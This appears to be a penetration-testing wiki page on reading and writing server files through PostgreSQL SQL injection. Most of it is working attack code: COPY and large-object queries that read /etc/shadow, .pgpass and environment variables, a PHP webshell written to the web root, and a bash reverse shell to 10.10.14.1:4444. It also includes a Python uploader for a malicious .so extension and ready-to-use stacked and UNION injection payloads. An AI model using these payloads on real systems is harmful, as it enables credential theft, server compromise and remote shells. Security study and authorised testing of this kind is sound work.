---
tags: [attack/web, attack]
module: advanced_sql_injections
last_updated: 2026-05-22
source_count: 1
---

# PostgreSQL File Read/Write via SQLi

Two methods for reading and writing files on the server filesystem through a PostgreSQL SQL injection. All operations run as the `postgres` OS user.

## Permission Check First

```sql
-- Is the database user a superuser?
SELECT current_setting('is_superuser');   -- 'on' = superuser

-- Does the user have specific file roles?
SELECT r.rolname, ARRAY(
  SELECT b.rolname FROM pg_catalog.pg_auth_members m
  JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
  WHERE m.member = r.oid
) AS memberof
FROM pg_catalog.pg_roles r WHERE r.rolname = current_user;

-- Required roles:
-- File read:  superuser  OR  pg_read_server_files
-- File write: superuser  OR  pg_write_server_files
-- COPY PROGRAM: superuser OR pg_execute_server_program
```

---

## Method 1: COPY

Built into PostgreSQL. `COPY FROM` reads a file into a table; `COPY TO` writes a table to a file.

### Reading Files

```sql
-- Basic read
CREATE TABLE tmp(t TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
DROP TABLE tmp;

-- If the file contains tab characters (default delimiter), COPY will error.
-- Workaround: use a delimiter that cannot appear in the file (e.g., BEL char 0x07)
CREATE TABLE tmp(t TEXT);
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
DROP TABLE tmp;

-- One-liner using subquery (no cleanup needed if you drop immediately)
CREATE TABLE tmp(t TEXT);
COPY tmp FROM '/etc/shadow' DELIMITER E'\x07';
SELECT STRING_AGG(t, E'\n') FROM tmp;
DROP TABLE tmp;
```

Useful files to target:

| File | Contains |
|------|---------|
| `/etc/passwd` | User accounts and home directories |
| `/etc/shadow` | Password hashes (if postgres has read access — rare) |
| `/etc/hosts` | Internal DNS / host map |
| `~postgres/.pgpass` | Stored database credentials |
| Application config files | DB passwords, API keys |
| `/proc/self/environ` | Environment variables of the postgres process |

### Writing Files

```sql
-- Write arbitrary content to a file the postgres user can write to
CREATE TABLE tmp(t TEXT);
INSERT INTO tmp VALUES('<?php system($_GET["cmd"]); ?>');
COPY tmp TO '/var/www/html/shell.php';
DROP TABLE tmp;

-- Write a reverse shell script
CREATE TABLE tmp(t TEXT);
INSERT INTO tmp VALUES('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1');
COPY tmp TO '/tmp/rev.sh';
DROP TABLE tmp;
-- Then trigger execution via COPY FROM PROGRAM (see postgresql_rce.md)
```

---

## Method 2: Large Objects

More flexible than COPY — can transfer arbitrary binary files and does not require the exact file path to be known at import time. Used for uploading compiled `.so` extensions (see [[attack/web/postgresql_rce]]).

### Reading Files

```sql
-- Import file into a large object (any user can call lo_import with superuser)
SELECT lo_import('/etc/passwd');      -- returns OID e.g. 16513

-- Read the object as hex
SELECT lo_get(16513);                 -- returns \x726f6f74...

-- Or read page by page (each page is 2kb max)
SELECT data FROM pg_largeobject WHERE loid = 16513 AND pageno = 0;
SELECT data FROM pg_largeobject WHERE loid = 16513 AND pageno = 1;

-- Find OIDs if you lost track
SELECT DISTINCT loid FROM pg_largeobject;

-- Cleanup
SELECT lo_unlink(16513);
```

Decode hex output on the attacker machine:

```bash
# Paste the hex string (without \x prefix) and decode
echo "726f6f743a783a303a30..." | xxd -r -p
```

### Writing Files (uploading to server)

Used to upload binary payloads (e.g., `.so` extension files) that COPY cannot handle cleanly.

```bash
# 1. Split file into 2kB chunks
split -b 2048 pg_rev_shell.so

# 2. Hex-encode each chunk
xxd -ps -c 99999999 xaa    # → hex string for page 0
xxd -ps -c 99999999 xab    # → hex string for page 1

# 3. In psql: create large object, insert pages, export to disk
```

```sql
-- Create object with a known ID
SELECT lo_create(31337);

-- Insert each page (substitute actual hex strings)
INSERT INTO pg_largeobject (loid, pageno, data)
  VALUES (31337, 0, DECODE('<hex_page_0>', 'HEX'));
INSERT INTO pg_largeobject (loid, pageno, data)
  VALUES (31337, 1, DECODE('<hex_page_1>', 'HEX'));

-- Export to filesystem path
SELECT lo_export(31337, '/tmp/pg_rev_shell.so');

-- Cleanup
SELECT lo_unlink(31337);
```

Alternative if INSERT into `pg_largeobject` fails (permission issue):

```sql
SELECT lo_put(31337, 0, '<data>');   -- bypasses direct pg_largeobject INSERT requirement
```

### Scripted Upload

```python
import psycopg2, math

conn = psycopg2.connect("host=127.0.0.1 dbname=bluebird user=bbuser password=bbpass")
cur = conn.cursor()

with open("pg_rev_shell.so", "rb") as f:
    raw = f.read()

loid = 31337
cur.execute(f"SELECT lo_create({loid})")

for pageno in range(math.ceil(len(raw) / 2048)):
    page = raw[pageno * 2048 : (pageno + 1) * 2048]
    cur.execute(
        "INSERT INTO pg_largeobject (loid, pageno, data) VALUES (%s, %s, %s)",
        (loid, pageno, psycopg2.Binary(page))
    )

cur.execute(f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so')")
cur.execute(f"SELECT lo_unlink({loid})")
conn.commit()
```

---

## Injecting File Operations via SQLi

When you cannot connect to psql directly, inject the COPY/Large Object queries through the injection point.

For **stacked query** injection points:

```
'; CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd' DELIMITER E'\x07'; --
```

Read the table contents with a subsequent UNION injection.

For **UNION-only** injection points, use a subquery to import and immediately read:

```sql
' UNION SELECT lo_get(lo_import('/etc/passwd'))::text,'2','3','4',5--
```

---

## Gotchas & Notes

- COPY operates as the **OS-level** `postgres` user, not the DB user. The file read/write permission is checked at the OS level.
- `lo_import` and `lo_export` require the file to be accessible by the `postgres` OS user. `/tmp/` is almost always writable; `/var/www/html/` depends on the web server setup.
- Large object pages are stored in `pg_largeobject` — these persist in the database after the session ends. Always `lo_unlink` after use to avoid leaving artefacts.
- Postgres `COPY TO` creates files owned by `postgres:postgres`. If you write a webshell, the web server must be able to read it.

## Related Pages

- [[attack/web/postgresql_rce]] — using COPY FROM PROGRAM or extensions after establishing file write
- [[attack/web/advanced_sqli_character_bypasses]] — injecting these queries through character-filtered endpoints
- [[attack/web/error_based_sqli]] — alternative exfiltration path
- [[attack/web/second_order_sqli]] — may need multi-step injection to trigger COPY
- [[tools/utility/psql]] — testing file operations directly

## Sources

- raw/advanced_sql_injections/postgresql_specific_techniques_reading_and_writing_files.md
